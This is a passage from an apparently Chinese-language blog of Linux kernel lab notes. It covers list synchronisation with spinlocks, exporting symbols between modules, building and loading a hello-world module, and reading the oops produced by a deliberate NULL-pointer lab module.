Protect list, is this read or write access? */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	list_for_each_safe(p, q, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		list_del(p);</span><br><span class="line">		kfree(ti);</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="comment">/* TODO 1: Critical sections ends here */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">list_sync_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	INIT_LIST_HEAD(&amp;head);</span><br><span class="line"></span><br><span class="line">	task_info_add_for_current();</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after first add&quot;</span>);</span><br><span class="line"></span><br><span class="line">	set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">	schedule_timeout(<span class="number">5</span> * HZ);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">list_sync_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	ti = list_entry(head.prev, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">	atomic_set(&amp;ti-&gt;count, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">	task_info_remove_expired();</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after removing expired&quot;</span>);</span><br><span class="line">	task_info_purge_list();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(list_sync_init);</span><br><span class="line">module_exit(list_sync_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">6</span>-<span class="built_in">list</span>-sync<span class="meta"># insmod list-sync.ko                </span></span><br><span class="line">list_sync: loading out-of-tree <span class="keyword">module</span> taints kernel.                            </span><br><span class="line">after first add: [                                                              </span><br><span class="line">(<span class="number">1</span>, <span class="number">4294905468</span>)                                                                 </span><br><span class="line">(<span class="number">0</span>, <span class="number">4294905468</span>)                                                                 </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294905468</span>)                                                               </span><br><span class="line">(<span class="number">237</span>, <span class="number">4294905468</span>)                                                               </span><br><span class="line">]                                                                               </span><br><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">6</span>-<span class="built_in">list</span>-sync<span class="meta"># rmmod list-sync.ko                 </span></span><br><span class="line">after removing expired: [                                                       </span><br><span class="line">(<span class="number">237</span>, <span class="number">4294905468</span>)                                                               </span><br><span class="line">]       </span><br></pre></td></tr></table></figure>
<ul>
<li>一般有循环的地方都要加锁（这里加的是自旋锁）</li>
</ul>
<p>7.Test module calling in our list module：</p>
<ul>
<li>从位于目录 <code>6-list-sync/</code> 的模块中导出各个符号</li>
<li>删除 <code>6-list-sync/</code> 的模块中所有的锁</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 lab3 - task 7</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Test list processing&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">task_info_add_for_current</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">task_info_remove_expired</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">task_info_print_list</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">list_test_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 1: Uncomment after exporting the symbols in 6-list-sync. */</span></span><br><span class="line">	task_info_add_for_current();</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after new addition&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">list_test_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 1: Uncomment after exporting the symbols in 6-list-sync. */</span></span><br><span class="line">	task_info_remove_expired();</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after removing expired&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(list_test_init);</span><br><span class="line">module_exit(list_test_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~<span class="meta"># insmod ./skels/kernel_api/6-list-sync/list-sync.ko              </span></span><br><span class="line">list_sync: loading out-of-tree <span class="keyword">module</span> taints kernel.                            </span><br><span class="line">after first add: [                                                              </span><br><span class="line">(<span class="number">1</span>, <span class="number">4294904706</span>)                                                                 </span><br><span class="line">(<span class="number">0</span>, <span class="number">4294904706</span>)                                                                 </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294904706</span>)                                                               </span><br><span class="line">(<span class="number">237</span>, <span class="number">4294904706</span>)                                                               </span><br><span class="line">]                                                                               </span><br><span class="line">root@qemux86:~<span class="meta"># insmod ./skels/kernel_api/7-list-test/list-test.ko              </span></span><br><span class="line">after <span class="keyword">new</span> addition: [                                                           </span><br><span class="line">(<span class="number">238</span>, <span class="number">4294906931</span>)                                                               </span><br><span class="line">(<span class="number">1</span>, <span class="number">4294906931</span>)                                                                 </span><br><span class="line">(<span class="number">0</span>, <span class="number">4294906931</span>)                                                                 </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294906931</span>)                                                               </span><br><span class="line">(<span class="number">237</span>, <span class="number">4294904706</span>)                                                               </span><br><span class="line">]  </span><br></pre></td></tr></table></figure>
<ul>
<li>在加载模块的时候出现了死锁的问题，最后才发现需要把 <code>Synchronizing list work</code> 中的锁删掉 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">insmod/<span class="number">238</span> is trying to acquire lock:                                           </span><br><span class="line">d0847110 (lockA)&#123;+.+.&#125;-&#123;<span class="number">2</span>:<span class="number">2</span>&#125;, at: task_info_add_to_list+<span class="number">0x11</span>/<span class="number">0xb0</span> [list_sync]   </span><br><span class="line">                                                                                </span><br><span class="line">but task is already holding lock:                                               </span><br><span class="line">d0847110 (lockA)&#123;+.+.&#125;-&#123;<span class="number">2</span>:<span class="number">2</span>&#125;, at: task_info_add_to_list+<span class="number">0x11</span>/<span class="number">0xb0</span> [list_sync]   </span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/10/Linux-Lab1-Kernel%20modules/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/10/Linux-Lab1-Kernel%20modules/" class="post-title-link" itemprop="url">Linux-Lab1-Kernel modules</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-10 19:33:46 / Modified: 19:34:49" itemprop="dateCreated datePublished" datetime="2022-10-10T19:33:46+08:00">2022-10-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Kernel modules</strong></p>
<ul>
<li>创建简单模块</li>
<li>描述内核模块编译的过程</li>
<li>介绍如何将模块与内核一起使用</li>
<li>简单的内核调试方法</li>
</ul>
<p><strong>An example of a kernel module</strong></p>
<p>下面是一个非常简单的内核模块示例：（源代码在 <code>linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.c</code> 文件中）</p>
<ul>
<li>当加载到内核中时，它将生成消息 “Hello”</li>
<li>卸载内核模块时，将生成消息 “Goodbye”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Simple module&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Kernel Hacker&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_debug(<span class="string">&quot;Hello!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_debug(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>生成的消息不会显示在控制台上，但会保存在为此专门保留的内存区域中，日志记录守护程序 （syslog） 将从中提取这些消息</li>
<li>要显示内核消息，可以使用 dmesg 命令或检查日志</li>
</ul>
<p><strong>Compiling kernel modules</strong></p>
<p>编译内核模块不同于编译用户程序：</p>
<ul>
<li>首先，应使用其他标头（<code>#include&lt;&gt;</code>）</li>
<li>此外，模块不应链接到库</li>
<li>最后，必须使用与加载模块的内核相同的选项来编译模块</li>
</ul>
<p>由于上述原因，有一种标准方法用于编译内核，这种方法需要两个文件 <code>Makefile</code> <code>Kbuild</code></p>
<p><code>Makefile</code>：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KDIR = /lib/modules/`uname -r`/build</span><br><span class="line"></span><br><span class="line"><span class="section">kbuild:</span></span><br><span class="line">        make -C <span class="variable">$(KDIR)</span> M=`pwd`</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        make -C <span class="variable">$(KDIR)</span> M=`pwd` clean</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/lib/modules</code> 里面是内核模块，具有用于构建源代码的软链接</li>
<li>“-C” 选项的作用是：<ul>
<li>指将当前工作目录转移到你所指定的位置：<code>/lib/modules/`uname -r`/build</code></li>
</ul>
</li>
<li>“M=” 选项的作用是：<ul>
<li>当用户需要以某个内核为基础编译一个外部模块的话，需要在命令中加入 <code>M=dir</code></li>
<li>程序会自动到你所指定的 <code>dir</code> 目录中查找模块源码，将其编译，生成KO文件</li>
</ul>
</li>
<li>先设置当前工作目录为 <code>KDIR</code>（为了使用其“用于构建源代码的软链接”），然后在 <code>kbuild</code> 文件中寻找模块源码，最后使用 <code>KDIR</code> 中的软链接进行编译</li>
</ul>
<p><code>Kbuild</code>：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ccflags-y = -Wno-unused-function -Wno-unused-label -Wno-unused-variable -DDEBUG</span><br><span class="line"></span><br><span class="line">obj-m = hello_mod.o</span><br></pre></td></tr></table></figure>
<ul>
<li><code>Kbuild</code> 中具有具体的编译参数，并且会指定模块源码的名称</li>
</ul>
<p>直接使用 <code>make</code> 命令就可以编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  1-2-test-mod git:(master) ✗ make      </span><br><span class="line">make -C /lib/modules/`uname -r`/build M=`pwd`</span><br><span class="line">make[1]: 进入目录“/usr/src/linux-headers-5.15.0-48-generic”</span><br><span class="line">  CC [M]  /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.o</span><br><span class="line">  MODPOST /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/Module.symvers</span><br><span class="line">  CC [M]  /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.mod.o</span><br><span class="line">  LD [M]  /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.ko</span><br><span class="line">  BTF [M] /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.ko</span><br><span class="line">Skipping BTF generation for /home/yhellow/linux/tools/labs/skels/kernel_modules/1-2-test-mod/hello_mod.ko due to unavailability of vmlinux</span><br><span class="line">make[1]: 离开目录“/usr/src/linux-headers-5.15.0-48-generic”</span><br></pre></td></tr></table></figure>
<p>不过这是内核模块的标准编译方式，使用了本机的 <code>/lib/modules/</code></p>
<ul>
<li>如果想编译用于虚拟机的内核模块，则需要对 <code>KDIR</code> 作出修改：</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KDIR = /home/yhellow/linux</span><br></pre></td></tr></table></figure>
<p>如果编译时需要使用多个子模块，就使用如下 <code>Kbuild</code> 示例：（示例文件在 <code>linux/tools/labs/skels/kernel_modules/4-multi-mod</code> 目录中）</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ccflags-y = -Wno-unused-function -Wno-unused-label -Wno-unused-variable</span><br><span class="line"></span><br><span class="line">obj-m        = supermodule.o</span><br><span class="line">supermodule-y = mod1.o mod2.o</span><br></pre></td></tr></table></figure>
<p><strong>Loading/UnLoading a kernel module</strong></p>
<p>要装入内核模块，使用 <code>insmod</code> 命令</p>
<p>要从内核中卸载模块，使用 <code>rmmod</code> 命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insmod module.ko</span><br><span class="line">rmmod module.ko</span><br></pre></td></tr></table></figure>
<ul>
<li>加载内核模块时，将执行指定为宏参数的例程</li>
<li>同样，当卸载模块时，将执行指定为 参数的例程</li>
</ul>
<p>加载/卸载内核模块的完整示例如下所示：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  1-2-test-mod git:(master) ✗ sudo insmod hello_mod.ko</span><br><span class="line">➜  1-2-test-mod git:(master) ✗ dmesg | tail -1</span><br><span class="line">[ 1817.709484] Hello!</span><br><span class="line">➜  1-2-test-mod git:(master) ✗ ls /sys/module | grep hello </span><br><span class="line">hello_mod</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  1-2-test-mod git:(master) ✗ sudo rmmod hello_mod.ko </span><br><span class="line">➜  1-2-test-mod git:(master) ✗ dmesg | tail -2            </span><br><span class="line">[ 1817.709484] Hello!</span><br><span class="line">[ 1943.965668] Goodbye!</span><br><span class="line">➜  1-2-test-mod git:(master) ✗ ls /sys/module | grep hello</span><br></pre></td></tr></table></figure>
<p><strong>Kernel Module Debugging</strong></p>
<p>对内核模块进行故障排除比调试常规程序要复杂得多：</p>
<ul>
<li>内核模块中的错误可能导致阻塞整个系统</li>
<li>故障排除速度大大减慢</li>
</ul>
<p>为避免重新启动，建议使用虚拟机（<code>qemu, virtualbox, vmware</code>）</p>
<p>当包含错误的模块插入内核时，它最终会生成一个 kernel oops（内核警告）：</p>
<ul>
<li>kernel oops 源自于内核检测到的无效操作，只能由内核生成</li>
<li>出现 kernel oops 后，内核将继续进行工作</li>
<li>kernel oops 将会作为一个消息，内核生成的消息被保存在日志中，可以使用 dmesg 命令显示</li>
</ul>
<p>为了确保没有内核消息丢失，建议直接从控制台插入测试内核，或定期检查内核消息（值得注意的是，由于编程错误，也可能因硬件错误而发生 kernel oops）</p>
<p>相对应的，如果内核发生致命错误，则会产生 kernel panic（内核崩溃）：</p>
<ul>
<li>出现 kernel panic 后，系统无法返回到稳定状态</li>
</ul>
<p>看看下面的内核模块，其中包含一个生成 kernel oops 的错误：（源代码在 <code>linux/tools/labs/skels/kernel_modules/5-oops-mod/oops_mod.c</code> 文件中）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Oops generating module&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;So2rul Esforever&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_oops_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;before init\n&quot;</span>);</span><br><span class="line">	*p = <span class="string">&#x27;a&#x27;</span>; <span class="comment">/* 空指针赋值 */</span></span><br><span class="line">	pr_info(<span class="string">&quot;after init\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_oops_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;module goes all out\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_oops_init);</span><br><span class="line">module_exit(my_oops_exit);</span><br></pre></td></tr></table></figure>
<p>测试结果如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  5-oops-mod git:(master) ✗ sudo insmod oops_mod.ko </span><br><span class="line">[1]    13015 killed     sudo insmod oops_mod.ko</span><br></pre></td></tr></table></figure>
<ul>
<li>内核检测到了 kernel oops，并且 <code>kill</code> 掉了该进程，使用 <code>dmesg</code> 查看下系统日志：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">➜  5-oops-mod git:(master) ✗ dmesg | tail -64</span><br><span class="line">[  139.812510] before init</span><br><span class="line">[  139.812512] BUG: kernel NULL pointer dereference, address: 0000000000000000</span><br><span class="line">[  139.812515] #PF: supervisor write access in kernel mode</span><br><span class="line">[  139.812516] #PF: error_code(0x0002) - not-present page</span><br><span class="line">[  139.812517] PGD 0 P4D 0 </span><br><span class="line">[  139.812519] Oops: 0002 [#1] SMP NOPTI</span><br><span class="line">[  139.812521] CPU: 1 PID: 3543 Comm: insmod Tainted: G           OE     5.15.0-48-generic #54~20.04.1-Ubuntu</span><br><span class="line">[  139.812523] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020</span><br><span class="line">[  139.812524] RIP: 0010:my_oops_init+0x15/0x31 [oops_mod]</span><br><span class="line">[  139.812528] Code: Unable to access opcode bytes at RIP 0xffffffffc0b1bfeb.</span><br><span class="line">[  139.812528] RSP: 0018:ffffb1bb85c6bb98 EFLAGS: 00010246</span><br><span class="line">[  139.812530] RAX: 000000000000000b RBX: 0000000000000000 RCX: 0000000000000027</span><br><span class="line">[  139.812530] RDX: 0000000000000000 RSI: ffffb1bb85c6b9e0 RDI: ffff942775e60588</span><br><span class="line">[  139.812531] RBP: ffffb1bb85c6bb98 R08: ffff942775e60580 R09: 0000000000000001</span><br><span class="line">[  139.812532] R10: 0000000000000001 R11: 000000000000000f R12: ffffffffc0b1c000</span><br><span class="line">[  139.812533] R13: ffff942695cb5ac0 R14: ffffffffc0b1e000 R15: 0000000000000000</span><br><span class="line">[  139.812534] FS:  00007f0f977db740(0000) GS:ffff942775e40000(0000) knlGS:0000000000000000</span><br><span class="line">[  139.812535] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[  139.812536] CR2: ffffffffc0b1bfeb CR3: 00000001a9510003 CR4: 0000000000770ee0</span><br><span class="line">[  139.812557] PKRU: 55555554</span><br><span class="line">[  139.812558] Call Trace:</span><br><span class="line">[  139.812559]  &lt;TASK&gt;</span><br><span class="line">[  139.812561]  do_one_initcall+0x46/0x1e0</span><br><span class="line">[  139.812565]  ? __cond_resched+0x19/0x40</span><br><span class="line">[  139.812568]  ? kmem_cache_alloc_trace+0x15a/0x420</span><br><span class="line">[  139.812571]  do_init_module+0x52/0x230</span><br><span class="line">[  139.812574]  load_module+0x1376/0x1600</span><br><span class="line">[  139.812576]  __do_sys_finit_module+0xbf/0x120</span><br><span class="line">[  139.812578]  ? __do_sys_finit_module+0xbf/0x120</span><br><span class="line">[  139.812579]  __x64_sys_finit_module+0x1a/0x20</span><br><span class="line">[  139.812581]  do_syscall_64+0x59/0xc0</span><br><span class="line">[  139.812583]  ? fput+0x13/0x20</span><br><span class="line">[  139.812584]  ? ksys_mmap_pgoff+0x14b/0x2a0</span><br><span class="line">[  139.812586]  ? exit_to_user_mode_prepare+0x3d/0x1c0</span><br><span class="line">[  139.812588]  ? exit_to_user_mode_prepare+0x3d/0x1c0</span><br><span class="line">[  139.812589]  ? syscall_exit_to_user_mode+0x27/0x50</span><br><span class="line">[  139.812591]  ? __x64_sys_mmap+0x33/0x50</span><br><span class="line">[  139.812592]  ? do_syscall_64+0x69/0xc0</span><br><span class="line">[  139.812593]  ? do_syscall_64+0x69/0xc0</span><br><span class="line">[  139.812594]  entry_SYSCALL_64_after_hwframe+0x61/0xcb</span><br><span class="line">[  139.812596] RIP: 0033:0x7f0f9792173d</span><br><span class="line">[  139.812598] Code: 00 